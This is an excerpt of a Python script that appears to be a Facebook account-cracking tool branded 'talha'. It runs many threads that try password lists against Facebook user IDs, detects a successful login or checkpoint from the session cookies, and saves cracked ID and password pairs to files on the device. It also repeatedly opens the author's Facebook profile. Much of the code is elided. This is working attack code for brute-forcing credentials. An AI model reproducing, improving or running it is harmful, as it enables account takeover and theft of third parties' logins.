...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> talha/😍 TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
			os.system(f'xdg-open https://www.facebook.com/boss.talha.vhi?mibextid=ZbWKwL')
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/talha.txt')
				linex()
				...
				with tred(max_workers=90) as crack_submit:
					...
					for user in fo:
						...
						if mthd in ['1','01']:
							...
							os.system("xdg-open https://www.facebook.com/boss.talha.vhi?mibextid=ZbWKwL?mibextid=ZbWKwL")
				...
				os.system(f'xdg-open https://www.facebook.com/boss.talha.vhi?mibextid=ZbWKwL');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[talha / 😍] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			talha=session.cookies.get_dict().keys()
			if "c_user" in talha:
				print('\r\r\033[1;31m[talha-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/talha-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in talha:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[talha-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/talha-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[talha / 😍] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in talha:
				...
				print('\r\r\033[1;32m[talha-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[talha-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mtalha / 😍\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[talha-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[talha-OK] '+cid+' | '+ps+'\33[0;97m')
